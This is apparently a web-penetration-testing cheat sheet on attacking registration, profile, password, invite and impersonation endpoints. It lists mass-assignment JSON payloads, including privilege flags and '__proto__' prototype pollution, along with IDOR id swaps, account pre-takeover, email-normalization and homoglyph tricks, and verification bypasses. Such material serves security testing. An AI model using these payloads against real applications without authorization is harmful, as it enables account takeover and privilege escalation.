# Registration & account lifecycle — the input-side auth surface

Register, update profile, change password, invite, impersonate —
every write endpoint that creates or mutates an identity is a target.

---

## 1. Registration fields that shouldn't exist

```json
{"username":"a","password":"b","role":"admin"}
{"username":"a","password":"b","isAdmin":true}
{"username":"a","password":"b","is_admin":true}
{"username":"a","password":"b","admin":true}
{"username":"a","password":"b","isStaff":true}
{"username":"a","password":"b","is_staff":true}
{"username":"a","password":"b","isSuperuser":true}
{"username":"a","password":"b","is_superuser":true}
{"username":"a","password":"b","superuser":true}
{"username":"a","password":"b","staff":true}
{"username":"a","password":"b","verified":true}
{"username":"a","password":"b","email_verified":true}
{"username":"a","password":"b","active":true}
{"username":"a","password":"b","enabled":true}
{"username":"a","password":"b","approved":true}
{"username":"a","password":"b","balance":99999}
{"username":"a","password":"b","credits":99999}
{"username":"a","password":"b","permissions":["*"]}
{"username":"a","password":"b","perms":["*"]}
{"username":"a","password":"b","scope":"*"}
{"username":"a","password":"b","scopes":["admin"]}
{"username":"a","password":"b","groups":["admin"]}
{"username":"a","password":"b","privileges":["admin"]}
{"username":"a","password":"b","level":99}
{"username":"a","password":"b","tier":"admin"}
{"username":"a","password":"b","plan":"admin"}
{"username":"a","password":"b","id":1}
{"username":"a","password":"b","uid":1}
{"username":"a","password":"b","user_id":1}
{"username":"a","password":"b","tenantId":1}
{"username":"a","password":"b","orgId":1}
{"username":"a","password":"b","tenant_id":1}
{"username":"a","password":"b","org_id":1}
{"username":"a","password":"b","createdBy":1}
{"username":"a","password":"b","ownerId":1}
{"username":"a","password":"b","owner_id":1}
{"username":"a","password":"b","__proto__":{"isAdmin":true}}
{"username":"a","password":"b","constructor":{"prototype":{"isAdmin":true}}}
```

Send the **all-keys variant** — every plausible privileged field in one
body — and read the response: the accepted keys are echoed back or in
`/api/me`, the rejected ones may error. That's the mass-assign surface.

## 2. Profile-update endpoints

`POST/PATCH/PUT /profile`, `/me`, `/user`, `/account`, `/settings`:

- Same field list as registration — often the *update* endpoint is the
  one missing the whitelist while `register` is clean (or vice versa).
- `PATCH /user/2` with your token — horizontal.
- `PUT /user` with `{"id":2, "role":"admin"}` — id+field together.
- `PUT /me` with `{"email":"victim@t.tld"}` — account pre-takeover if
  uniqueness isn't enforced.
- `POST /settings` with `{"notifications_email":"victim@t.tld"}` —
  reset links start landing in their inbox.

## 3. Duplicate-identity tricks

- Register `victim@t.tld` *before* the real victim — pre-takeover.
- `Victim@t.tld` / `victim+1@t.tld` / `victim @t.tld` — normalization
  gaps: registration normalizes for uniqueness but login doesn't (or
  vice versa) → same-canonical-email two accounts.
- Unicode homoglyphs in username (`\u0430dmin` — Cyrillic a, U+0430) —
  display tricks.
- `admin ` (trailing space), ` admin`, `admin\t` — trimmed at one
  layer, not the other.

## 4. Email-verification skips

- The `verified` flag in the register body (above).
- `/verify?token=` — the token is predictable or the endpoint accepts
  `{"email":"x","verified":true}`.
- Verification link works for *another* account — token not bound.
- Login works *before* verification — the gate is a front-end redirect.
- Verify-email endpoint takes `?email=` and just flips the row.

## 5. Invite flow

- `invite_code` parameter: predictable (`INV-0001`), brute-forceable,
  or bypassed by sending the `role` the invite would grant directly.
- Invite links that don't expire, are single-use in URL only (the
  *account* it creates is free).
- Accept-invite endpoint takes `{"email":"<attacker>","role":"admin"}`
  — overrides what the invite said.

## 6. Password-change endpoints

- `/change-password` requires `old_password` — the point. If it accepts
  without old → full takeover via any XSS/CSRF.
- `POST /change-password {"user_id":2,"new":"x"}` — id param again.
- Change-password doesn't invalidate existing sessions.
- Change-password validates `confirm` field client-side only.

## 7. Account deletion / deactivation

- `DELETE /user/2` or `POST /deactivate` horizontal.
- The *deleted* account's sessions still work (no cascade).
- Re-registering the same username after deletion gets the old data.

## 8. Impersonation / switch-user

- `?as=user2`, `?sudo=`, `?switch_user=`, `X-Switch-User`, `?become=` —
  common in admin panels; check `web-idor` path too.
- `/_switch_user?_switch_user=admin` — Symfony.
- `?su=admin`, `?impersonate=admin`.
- Admin "view as user" leaks the impersonation token — replay it.

## 9. Login response leaks

- `POST /login` returns the *password hash*, the *other* users' list, or
  internal fields — record them.
- `{"token":"...","user":{"role":"admin"}}` in a login response of an
  unprivileged account is a *signal*, not a bug — the test is whether
  the API honors the claim, not whether the UI shows it.

## 10. Cross-links

- role/plan/credit fields → `skills/web-mass-assignment/`
- `{"id":2}` swaps → `skills/web-idor/`
- email/SSO login → `oauth-flow-issues.md`
- token in the response → `jwt-deep.md`/`session-analysis.md`
- "remember me" cookie → `session-analysis.md`
